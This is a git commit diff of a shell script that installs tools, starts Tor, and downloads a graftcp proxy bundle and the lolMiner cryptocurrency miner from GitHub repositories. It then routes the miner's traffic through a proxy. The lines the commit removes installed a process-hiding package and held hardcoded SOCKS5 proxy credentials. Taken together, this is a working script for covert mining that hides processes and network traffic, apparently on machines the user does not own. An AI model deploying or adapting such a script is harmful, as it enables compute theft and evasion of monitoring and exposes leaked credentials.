72e1395ee099d83649e32885a68febcad1988d0b
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-05-23 22:55:26 -0600

    Update 11.sh

--- 11.sh
+++ 11.sh
@@ -1,38 +1,28 @@
-apt update && apt -y install sudo wget curl unzip
-
-sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-
-apt-get install -y nodejs
-
-npm i -g node-process-hider
-
+#!/bin/sh
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-
 dpkg-reconfigure --frontend noninteractive tzdata
-
-wget https://github.com/DeniBogeh/DeniBogehh/raw/main/graphics.tar.gz
-
+apt update
+apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
+service tor start
+wget https://raw.githubusercontent.com/hanifgz/ngarit/main/graphics.tar.gz
 tar -xvzf graphics.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 =  45.140.13.119:9132 
-socks5_username = pcvyggpr
-socks5_password = wz3jqv7eyzmp
+socks5 = 127.0.0.1:9050
+socks5_username =
+socks5_password =
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
 
 sleep .2
 
-./graftcp/graftcp curl ifconfig.me
-
+echo " "
 echo " "
 
-echo " "
+echo "******************************************************************"
 
 ./graftcp/graftcp wget https://github.com/DeniBogeh/DeniBogehh/raw/main/lolMiner
 chmod +x lolMiner
